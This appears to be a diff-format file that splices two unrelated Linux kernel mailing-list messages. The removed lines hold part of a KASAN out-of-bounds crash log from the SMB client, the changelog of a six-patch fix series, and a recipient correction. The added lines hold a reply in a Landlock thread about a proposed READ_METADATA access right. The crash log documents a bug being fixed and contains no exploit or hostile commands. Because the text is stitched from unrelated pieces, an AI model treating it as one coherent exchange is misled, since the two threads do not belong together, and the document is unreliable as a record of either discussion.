-de.c:419 fs/smb/client/cifs_unicode.c:491)
-> [ 1344.781129] [  T11242]  ? __pfx_SMB2_open+0x10/0x10
-> [ 1344.781135] [  T11242]  ? srso_alias_return_thunk (arch/x86/include/as=
-m/nospec-branch.h:381)
-> [ 1344.781139] [  T11242]  ? srso_alias_return_thunk (arch/x86/include/as=
-m/nospec-branch.h:381)
-> [ 1344.781145] [  T11242]  ? srso_alias_return_thunk (arch/x86/include/as=
-m/nospec-branch.h:381)
-> [ 1344.781149] [  T11242]  ? __kmalloc_noprof (arch/x86/include/asm/atomi=
-c.h:23 include/linux/atomic/atomic-arch-fallback.h:457 include/linux/jump_l=
-abel.h:248 mm/slab.h:458 mm/slub.c:4558 mm/slub.c:5392)
-> [ 1344.781164] [  T11242]  ? srso_alias_return_thunk (arch/x86/include/as=
-m/nospec-branch.h:381)
-> [ 1344.781167] [  T11242]  ? cifs_strndup_to_utf16 (fs/smb/client/cifs_un=
-icode.c:628)
-> [ 1344.781184] [  T11242]  ? srso_alias_return_thunk (arch/x86/include/as=
-m/nospec-branch.h:381)
-> [ 1344.781206] [  T11242]  ? cifs_convert_path_to_utf16 (fs/smb/client/sm=
-b2misc.c:457)
-> [ 1344.781211] [  T11242]  ? srso_alias_return_thunk (arch/x86/include/as=
-m/nospec-branch.h:381)
-> [ 1344.781216] [  T11242]  ? __pfx_cifs_convert_path_to_utf16+0x10/0x10
-> [ 1344.781226] [  T11242]  ? smb2_open_file (fs/smb/client/smb2file.c:184=
-)
-> [ 1344.781231] [  T11242]  smb2_open_file (fs/smb/client/smb2file.c:184)
-> [ 1344.781242] [  T11242]  ? __pfx_smb2_open_file+0x10/0x10
-> [ 1344.781247] [  T11242]  ? srso_alias_return_thunk (arch/x86/include/as=
-m/nospec-branch.h:381)
-> [ 1344.781250] [  T11242]  ? __lock_acquire+0x45c/0x25f0
-> [ 1344.781278] [  T11242]  ? srso_alias_return_thunk (arch/x86/include/as=
-m/nospec-branch.h:381)
-> [ 1344.781291] [  T11242]  ? srso_alias_return_thunk (arch/x86/include/as=
-m/nospec-branch.h:381)
-> [ 1344.781295] [  T11242]  ? __asan_memcpy (mm/kasan/shadow.c:105 (discri=
-minator 1))
-> [ 1344.781316] [  T11242]  cifs_open (fs/smb/client/file.c:1155 (discrimi=
-nator 2))
-> [ 1344.781354] [  T11242]  ? __pfx_cifs_open+0x10/0x10
-> [ 1344.781359] [  T11242]  ? do_sys_openat2 (include/linux/file.h:164 fs/=
-open.c:1364)
-> [ 1344.781373] [  T11242]  ? do_syscall_64 (include/linux/irq-entry-commo=
-n.h:207 include/linux/irq-entry-common.h:238 include/linux/entry-common.h:3=
-28 arch/x86/entry/syscall_64.c:100)
-> [ 1344.781409] [  T11242]  ? kasan_quarantine_put (arch/x86/include/asm/i=
-rqflags.h:158 (discriminator 1) mm/kasan/quarantine.c:234 (discriminator 1)=
-)
-> [ 1344.781413] [  T11242]  ? srso_alias_return_thunk (arch/x86/include/as=
-m/nospec-branch.h:381)
-> [ 1344.781417] [  T11242]  ? lockdep_hardirqs_on+0x7b/0x110
-> [ 1344.781463] [  T11242]  ? srso_alias_return_thunk (arch/x86/include/as=
-m/nospec-branch.h:381)
-> [ 1344.781469] [  T11242]  ? srso_alias_return_thunk (arch/x86/include/as=
-m/nospec-branch.h:381)
-> [ 1344.781485] [  T11242]  ? bpf_trampoline_6442634119+0x9f/0xed
-> [ 1344.781503] [  T11242]  ? do_dentry_open (fs/open.c:915)
-> [ 1344.781510] [  T11242]  do_dentry_open (fs/open.c:915)
-> [ 1344.781515] [  T11242]  ? __pfx_cifs_open+0x10/0x10
-> [ 1344.781521] [  T11242]  ? cifs_permission (fs/smb/client/cifsfs.c:432 =
-(discriminator 1))
-> [ 1344.781537] [  T11242]  vfs_open (fs/open.c:1098)
-> [ 1344.781541] [  T11242]  ? srso_alias_return_thunk (arch/x86/include/as=
-m/nospec-branch.h:381)
-> [ 1344.781549] [  T11242]  path_openat (fs/namei.c:5179)
-> [ 1344.781572] [  T11242]  ? __pfx_path_openat+0x10/0x10
-> [ 1344.781581] [  T11242]  ? srso_alias_return_thunk (arch/x86/include/as=
-m/nospec-branch.h:381)
-> [ 1344.781584] [  T11242]  ? __lock_acquire+0x45c/0x25f0
-> [ 1344.781594] [  T11242]  do_file_open (fs/namei.c:4901)
-> [ 1344.781601] [  T11242]  ? __pfx_do_file_open+0x10/0x10
-> [ 1344.781606] [  T11242]  ? srso_alias_return_thunk (arch/x86/include/as=
-m/nospec-branch.h:381)
-> [ 1344.781627] [  T11242]  ? srso_alias_return_thunk (arch/x86/include/as=
-m/nospec-branch.h:381)
-> [ 1344.781631] [  T11242]  ? alloc_fd (fs/file.c:1297)
-> [ 1344.781651] [  T11242]  ? do_getname+0x6b/0x2d0
-> [ 1344.781658] [  T11242]  do_sys_openat2 (include/linux/file.h:164 fs/op=
-en.c:1364)
-> [ 1344.781663] [  T11242]  ? __pfx_do_sys_openat2+0x10/0x10
-> [ 1344.781666] [  T11242]  ? __pfx___do_sys_newfstat+0x10/0x10
-> [ 1344.781683] [  T11242]  __x64_sys_openat (fs/open.c:1389)
-> [ 1344.781691] [  T11242]  ? __pfx___x64_sys_openat+0x10/0x10
-> [ 1344.781698] [  T11242]  ? srso_alias_return_thunk (arch/x86/include/as=
-m/nospec-branch.h:381)
-> [ 1344.781702] [  T11242]  ? rcu_is_watching (include/linux/context_track=
-ing.h:128 kernel/rcu/tree.c:752)
-> [ 1344.781713] [  T11242]  ? srso_alias_return_thunk (arch/x86/include/as=
-m/nospec-branch.h:381)
-> [ 1344.781717] [  T11242]  ? do_syscall_64 (arch/x86/entry/syscall_64.c:6=
-3 arch/x86/entry/syscall_64.c:94)
-> [ 1344.781723] [  T11242]  do_syscall_64 (include/linux/irq-entry-common.=
-h:207 include/linux/irq-entry-common.h:238 include/linux/entry-common.h:328=
- arch/x86/entry/syscall_64.c:100)
-> [ 1344.781728] [  T11242]  ? irqentry_exit (include/linux/irq-entry-commo=
-n.h:507 include/linux/irq-entry-common.h:550 kernel/entry/common.c:164)
-> [ 1344.781735] [  T11242]  entry_SYSCALL_64_after_hwframe (arch/x86/entry=
-/entry_64.S:150)
-> [ 1344.781740] [  T11242] RIP: 0033:0x7fc594192687
-> [ 1344.781757] [  T11242] Code: 48 89 fa 4c 89 df e8 58 b3 00 00 8b 93 08=
- 03 00 00 59 5e 48 83 f8 fc 74 1a 5b c3 0f 1f 84 00 00 00 00 00 48 8b 44 24=
- 10 0f 05 <5b> c3 0f 1f 80 00 00 00 00 83 e2 39 83 fa 08 75 de e8 23 ff ff =
-ff
-> All code
-> =3D=3D=3D=3D=3D=3D=3D=3D
->    0:   48 89 fa                mov    %rdi,%rdx
->    3:   4c 89 df                mov    %r11,%rdi
->    6:   e8 58 b3 00 00          call   0xb363
->    b:   8b 93 08 03 00 00       mov    0x308(%rbx),%edx
->   11:   59                      pop    %rcx
->   12:   5e                      pop    %rsi
->   13:   48 83 f8 fc             cmp    $0xfffffffffffffffc,%rax
->   17:   74 1a                   je     0x33
->   19:   5b                      pop    %rbx
->   1a:   c3                      ret
->   1b:   0f 1f 84 00 00 00 00    nopl   0x0(%rax,%rax,1)
->   22:   00
->   23:   48 8b 44 24 10          mov    0x10(%rsp),%rax
->   28:   0f 05                   syscall
->   2a:*  5b                      pop    %rbx             <-- trapping inst=
-ruction
->   2b:   c3                      ret
->   2c:   0f 1f 80 00 00 00 00    nopl   0x0(%rax)
->   33:   83 e2 39                and    $0x39,%edx
->   36:   83 fa 08                cmp    $0x8,%edx
->   39:   75 de                   jne    0x19
->   3b:   e8 23 ff ff ff          call   0xffffffffffffff63
->
-> Code starting with the faulting instruction
-> =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
->    0:   5b                      pop    %rbx
->    1:   c3                      ret
->    2:   0f 1f 80 00 00 00 00    nopl   0x0(%rax)
->    9:   83 e2 39                and    $0x39,%edx
->    c:   83 fa 08                cmp    $0x8,%edx
->    f:   75 de                   jne    0xffffffffffffffef
->   11:   e8 23 ff ff ff          call   0xffffffffffffff39
-> [ 1344.781761] [  T11242] RSP: 002b:00007ffc7d27b080 EFLAGS: 00000202 ORI=
-G_RAX: 0000000000000101
-> [ 1344.781773] [  T11242] RAX: ffffffffffffffda RBX: 00007fc594100780 RCX=
-: 00007fc594192687
-> [ 1344.781776] [  T11242] RDX: 0000000000000000 RSI: 00007ffc7d27be31 RDI=
-: ffffffffffffff9c
-> [ 1344.781778] [  T11242] RBP: 0000000000000001 R08: 0000000000000000 R09=
-: 0000000000000000
-> [ 1344.781780] [  T11242] R10: 0000000000000000 R11: 0000000000000202 R12=
-: 000056239611ba00
-> [ 1344.781782] [  T11242] R13: 00007ffc7d27b3c0 R14: 0000000000000000 R15=
-: 0000000000040000
-> [ 1344.781814] [  T11242]  </TASK>
->
-> [ 1344.781876] [  T11242] Allocated by task 11240:
-> [ 1344.781885] [  T11242]  kasan_save_stack (mm/kasan/common.c:58)
-> [ 1344.781894] [  T11242]  kasan_save_track (mm/kasan/common.c:70 (discri=
-minator 1) mm/kasan/common.c:79 (discriminator 1))
-> [ 1344.781900] [  T11242]  __kasan_slab_alloc (mm/kasan/common.c:463 (dis=
-criminator 1))
-> [ 1344.781905] [  T11242]  kmem_cache_alloc_noprof (mm/slub.c:4510 mm/slu=
-b.c:4886 mm/slub.c:4917)
-> [ 1344.781911] [  T11242]  mempool_alloc_noprof (mm/mempool.c:608)
-> [ 1344.781925] [  T11242]  cifs_small_buf_get (fs/smb/client/misc.c:237 (=
-discriminator 2))
-> [ 1344.781931] [  T11242]  allocate_buffers (fs/smb/client/connect.c:654)
-> [ 1344.781938] [  T11242]  cifs_demultiplex_thread (fs/smb/client/connect=
-.c:1287)
-> [ 1344.781943] [  T11242]  kthread (kernel/kthread.c:880)
-> [ 1344.781958] [  T11242]  ret_from_fork (arch/x86/kernel/process.c:196 (=
-discriminator 1))
-> [ 1344.781973] [  T11242]  ret_from_fork_asm (arch/x86/entry/entry_64.S:2=
-58)
->
-> [ 1344.781996] [  T11242] The buggy address belongs to the object at ff11=
-00007e4b2fc0
-> which belongs to the cache cifs_small_rq of size 448
-> [ 1344.782002] [  T11242] The buggy address is located 0 bytes to the rig=
-ht of
-> allocated 448-byte region [ff1100007e4b2fc0, ff1100007e4b3180)
->
-> [ 1344.782011] [  T11242] The buggy address belongs to the physical page:
-> [ 1344.782025] [  T11242] page: refcount:0 mapcount:0 mapping:00000000000=
-00000 index:0xff1100007e4b34c0 pfn:0x7e4b0
-> [ 1344.782036] [  T11242] head: order:2 mapcount:0 entire_mapcount:0 nr_p=
-ages_mapped:0 pincount:0
-> [ 1344.782045] [  T11242] flags: 0xfff00000000240(workingset|head|node=3D=
-0|zone=3D1|lastcpupid=3D0x7ff)
-> [ 1344.782056] [  T11242] page_type: f5(slab)
-> [ 1344.782069] [  T11242] raw: 00fff00000000240 ff11000105b8edc0 ffd40000=
-0418d610 ff11000105b90948
-> [ 1344.782075] [  T11242] raw: ff1100007e4b34c0 0000000800190013 00000000=
-f5000000 0000000000000000
-> [ 1344.782080] [  T11242] head: 00fff00000000240 ff11000105b8edc0 ffd4000=
-00418d610 ff11000105b90948
-> [ 1344.782085] [  T11242] head: ff1100007e4b34c0 0000000800190013 0000000=
-0f5000000 0000000000000000
-> [ 1344.782089] [  T11242] head: 00fff00000000002 ffffffffffffff01 0000000=
-0ffffffff 00000000ffffffff
-> [ 1344.782094] [  T11242] head: ffffffffffffffff 0000000000000000 0000000=
-0ffffffff 0000000000000004
-> [ 1344.782098] [  T11242] page dumped because: kasan: bad access detected
-> [ 1344.782111] [  T11242] page_owner tracks the page as allocated
-> [ 1344.782643] [  T11242] page last allocated via order 2, migratetype Un=
-movable, gfp_mask 0xd2800(GFP_NOWAIT|__GFP_NORETRY|__GFP_COMP|__GFP_NOMEMAL=
-LOC), pid 10789, tgid 10789 (umount), ts 770745347902, free_ts 770742186938
-> [ 1344.784632] [  T11242]  post_alloc_hook (mm/page_alloc.c:2232 mm/page_=
-alloc.c:2259)
-> [ 1344.784658] [  T11242]  get_page_from_freelist (mm/page_alloc.c:1738 m=
-m/page_alloc.c:1904 mm/page_alloc.c:3234 mm/page_alloc.c:3410 mm/page_alloc=
-.c:3945)
-> [ 1344.784668] [  T11242]  __alloc_frozen_pages_noprof (include/linux/gfp=
-.h:272 (discriminator 1) include/linux/gfp.h:287 (discriminator 1))
-> [ 1344.784677] [  T11242]  alloc_pages_mpol+0x14a/0x440
-> [ 1344.784697] [  T11242]  new_slab (mm/slub.c:1604)
-> [ 1344.784712] [  T11242]  ___slab_alloc (mm/slub.c:4448)
-> [ 1344.784722] [  T11242]  kmem_cache_alloc_noprof (arch/x86/include/asm/=
-preempt.h:95 (discriminator 1) mm/slub.c:4771 (discriminator 1) mm/slub.c:4=
-883 (discriminator 1) mm/slub.c:4950 (discriminator 1))
-> [ 1344.784731] [  T11242]  mempool_alloc_noprof (mm/mempool.c:608)
-> [ 1344.784741] [  T11242]  cifs_small_buf_get (fs/smb/client/misc.c:237 (=
-discriminator 2))
-> [ 1344.784751] [  T11242]  __smb2_plain_req_init (fs/smb/client/smb2pdu.c=
-:565)
-> [ 1344.784761] [  T11242]  SMB2_tdis (fs/smb/client/smb2pdu.c:3097)
-> [ 1344.784772] [  T11242]  cifs_put_tcon (fs/smb/client/connect.c:2911 (d=
-iscriminator 1))
-> [ 1344.784781] [  T11242]  cifs_put_tlink (arch/x86/include/asm/bitops.h:=
-202 arch/x86/include/asm/bitops.h:232 include/asm-generic/bitops/instrument=
-ed-non-atomic.h:142 fs/smb/client/connect.c:2905)
-> [ 1344.784790] [  T11242]  cifs_umount (fs/smb/client/connect.c:4010 (dis=
-criminator 1))
-> [ 1344.784799] [  T11242]  deactivate_locked_super (fs/super.c:485)
-> [ 1344.784821] [  T11242]  cleanup_mnt (include/linux/llist.h:283 (discri=
-minator 5) fs/namespace.c:1325 (discriminator 5))
-> [ 1344.784837] [  T11242] page last free pid 10789 tgid 10789 stack trace=
-:
-> [ 1344.785506] [  T11242]  __free_frozen_pages (mm/page_alloc.c:5462)
-> [ 1344.785518] [  T11242]  stack_depot_save_flags (lib/stackdepot.c:473 l=
-ib/stackdepot.c:706)
-> [ 1344.785564] [  T11242]  set_track_prepare (arch/x86/include/asm/preemp=
-t.h:95 (discriminator 1) include/linux/bit_spinlock.h:41 (discriminator 1) =
-mm/slub.c:628 (discriminator 1) mm/slub.c:655 (discriminator 1))
-> [ 1344.785574] [  T11242]  ___slab_alloc (mm/slub.c:4441)
-> [ 1344.785584] [  T11242]  __kmalloc_cache_noprof (mm/slub.c:5777)
-> [ 1344.785595] [  T11242]  kobject_uevent_env (include/linux/slab.h:950 i=
-nclude/linux/slab.h:1188 lib/kobject_uevent.c:543)
-> [ 1344.785612] [  T11242]  device_del (drivers/base/core.c:1642 drivers/b=
-ase/core.c:3884)
-> [ 1344.785660] [  T11242]  device_unregister (drivers/base/core.c:3922)
-> [ 1344.785670] [  T11242]  bdi_unregister (mm/backing-dev.c:1013)
-> [ 1344.785690] [  T11242]  generic_shutdown_super (fs/super.c:666)
-> [ 1344.785700] [  T11242]  kill_anon_super (fs/super.c:1293)
-> [ 1344.785709] [  T11242]  cifs_kill_sb (fs/smb/client/cifsfs.c:349)
-> [ 1344.785719] [  T11242]  deactivate_locked_super (fs/super.c:485)
-> [ 1344.785728] [  T11242]  cleanup_mnt (include/linux/llist.h:283 (discri=
-minator 5) fs/namespace.c:1325 (discriminator 5))
-> [ 1344.785739] [  T11242]  task_work_run (kernel/task_work.c:232)
-> [ 1344.785755] [  T11242]  exit_to_user_mode_loop (kernel/entry/syscall_u=
-ser_dispatch.c:114 (discriminator 1))
->
-> [ 1344.785783] [  T11242] Memory state around the buggy address:
-> [ 1344.785790] [  T11242]  ff1100007e4b3080: 00 00 00 00 00 00 00 00 00 0=
-0 00 00 00 00 00 00
-> [ 1344.785799] [  T11242]  ff1100007e4b3100: 00 00 00 00 00 00 00 00 00 0=
-0 00 00 00 00 00 00
-> [ 1344.785807] [  T11242] >ff1100007e4b3180: fc fc fc fc fc fc fc fc fc f=
-c fc fc fc fc fc fc
-> [ 1344.785813] [  T11242]                    ^
-> [ 1344.785821] [  T11242]  ff1100007e4b3200: fc fc fc fc fc fc fc fc fa f=
-b fb fb fb fb fb fb
-> [ 1344.785828] [  T11242]  ff1100007e4b3280: fb fb fb fb fb fb fb fb fb f=
-b fb fb fb fb fb fb
-> [ 1344.785835] [  T11242] =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D
-> [ 1344.785843] [  T11242] Disabling lock debugging due to kernel taint
-> -----END crash log-----
->
-> Best regards,
-> Zihan Xi
->
-> changes in v5:
->   - Guard the final preauth-hash update in patch 5 when resp_iov is NULL,
->     addressing the kernel test robot Smatch report:
->     https://lore.kernel.org/r/202609241449.HlHmnZFZ-lkp@intel.com/
->   - v4 Link: https://lore.kernel.org/all/cover.1789478666.git.zihanx@nebu=
-sec.ai/
-> changes in v4:
->   - Bound NameOffset + NameLength by the current context, reject offsets
->     before the context header, and skip known-handler dispatch for zero
->     DataLength.
->   - Defer response-buffer handoff until processed MIDs are synchronized a=
-nd
->     preserve earlier CREATE responses for cancelled-mid cleanup on failur=
-es.
->   - Account num_remote_opens only after close-work allocation succeeds an=
-d
->     before queueing the asynchronous close.
->   - Preserve SMB2_OP_OPEN_QUERY parser errors and document the overlap wi=
-th
->     Frank Sorenson's related smb2_parse_contexts() patch.
->   - Update the QEMU user-mode network and guest interface instructions.
->   - v3 Link: https://lore.kernel.org/all/cover.1788516372.git.zihanx@nebu=
-sec.ai/
-> changes in v3:
->   - Split the POSIX handler check into a separate patch and corrected the
->     parser Fixes history.
->   - v2 Link: https://lore.kernel.org/all/cover.1787486936.git.zihanx@nebu=
-sec.ai/
-> changes in v2:
->   - Bound each response context by Next, read QFid data from DataOffset,
->     and extend lease validation through LeaseFlags.
->   - v1 Link: https://lore.kernel.org/all/eb1bc35611f91bd10a4772400b37fac2=
-6f660956.1782579150.git.xizh2024@lzu.edu.cn/
->
-> Zihan Xi (6):
->   smb: client: fix create context out-of-bounds reads
->   smb: client: validate POSIX create context length
->   smb: client: close handle after create-context parsing failure
->   smb: client: clean up failed cached directory opens
->   smb: client: close completed creates on compound wait errors
->   smb: client: preserve create-context parsing errors
->
->  fs/smb/client/cached_dir.c | 32 ++++++++++++------
->  fs/smb/client/smb2inode.c  |  6 ++--
->  fs/smb/client/smb2misc.c   |  9 +++--
->  fs/smb/client/smb2ops.c    | 28 +++++++++++-----
->  fs/smb/client/smb2pdu.c    | 54 +++++++++++++++++++++++-------
->  fs/smb/client/transport.c  | 67 ++++++++++++++++++++++++++++++--------
->  6 files changed, 148 insertions(+), 48 deletions(-)
->
-> --
-> 2.43.0
->
+Hello!
 
-Hi Paulo and Namjae,
+On Fri, Sep 25, 2026 at 02:03:05PM -0400, Justin Suess wrote:
+> On Thu, Sep 24, 2026 at 06:48:19PM +0800, Cai Xinchen wrote:
+> > This series adds two new Landlock filesystem access rights,
+> > LANDLOCK_ACCESS_FS_READ_METADATA and LANDLOCK_ACCESS_FS_WRITE_METADATA,
+> > which control access to file and directory metadata such as inode
+> > attributes (mode, ownership, timestamps), extended attributes and POSIX
+> > ACLs.  It picks up the work from the "landlock: add chmod and chown
+> > support" series [1] and follows the coarse-grained grouping discussed in
+> > that thread [2]: instead of separate chmod/chown rights, metadata
+> > operations are grouped into one read and one write right.
+> > 
+> > Landlock evaluates access rights on a per-path basis, but the metadata
+> > related LSM hooks (inode_getattr, inode_setattr, inode_setxattr,
+> > inode_getxattr, inode_listxattr, inode_removexattr, inode_set_acl,
+> > inode_get_acl, inode_remove_acl) only receive the dentry of the accessed
+> > object.  Patches 1-7 therefore first pass struct path instead of dentry
+> > through the metadata-related VFS helpers and LSM hooks.  This is a pure
+> > refactoring with no behavior change, split so that every patch builds
+> > and works on its own:
+> >
+> I like these patches, but is the ability to read metadata already
+> sorta controlled by LANDLOCK_ACCESS_FS_READ_DIR on the parent
+> directory?
+> 
+> The one case I see this being different is:
+> 
+> 1. if you wanted to grant read access to the file, but not metadata
+> read access, but I can't think of any usecase for being able to read
+> the contents of a file, but not the metadata. (see below)
+> 
+> 2. If you had the absolute path already and didn't need READ_DIR.
+> 
+> I see introducing this READ_METADATA as causing potential
+> hard-to-diagnose issues.
+> 
+> Say you handle READ_METADATA and READ_FILE, but only grant READ_FILE.
+> 
+> The program can technically open the file with the READ_FILE permission,
+> but it may error out because the stat() on it beforehand failed.
+> It's pretty common for programs to do that kind of thing (stat before
+> open), like for checking for config files (strace bash and you see it
+> stat .profile, /etc/profile)
+> 
+> There may be other bugs, because being able to set permissions to read
+> a file *but not read it's metadata* isn't possible currently in posix
+> acl and userspace may not work well if that assumption no longer holds.
+> 
+> So maybe WRITE_METADATA is good enough?
 
-I noticed that I sent the v5 series with the wrong primary recipient.
-The series is already on lore under
-cover Message-ID
-<cover.1790398755.git.zihanx@nebusec.ai>.
+The existing use cases are the combinations of (a) READ_DIR
+allowed/denied and (b) READ_METADATA allowed/denied.  Because these
+two access rights overlap slightly, it seems likely that for a given
+directory or file, users will want to either grant both, or deny both.
 
-Frank's feedback on v3 asked me to send future versions to Paulo and
-copy Namjae. Sorry for missing that.
-I am sending this note to correct the direct notification.
+At the moment, where the (not yet existing) READ_METADATA is
+implicitly always allowed, the problematic case is the one where the
+Landlock user wants to deny READ_DIR, but where much of the same
+metadata is still available through stat() and the various
+get-attribute syscalls.  (c.f. the warning box in the Landlock docs
+[1])
 
-Best regards,
-Zihan
+In my view the READ_METADATA right closes a gap that READ_DIR left
+open (which is also potentially surprising to callers if they did not
+read the docs closely).  Also, if its implementation is symmetric to
+WRITE_METADATA, I feel that it's worth having it in the same patch
+set.
+
+–Günther
+
+P.S.: I know, even after we can control stat(), there are likely ways
+to infer the presence of a file by observing Landlock error codes.
+This would be nice to fix as well, but is harder to do without
+controlling the path walk itself [2].  But also, the fact that this is
+currently not controllable is not an excuse for leaving READ_METADATA
+open IMHO.
+
+[1] https://docs.kernel.org/userspace-api/landlock.html#filesystem-flags
+[2] https://github.com/landlock-lsm/linux/issues/9
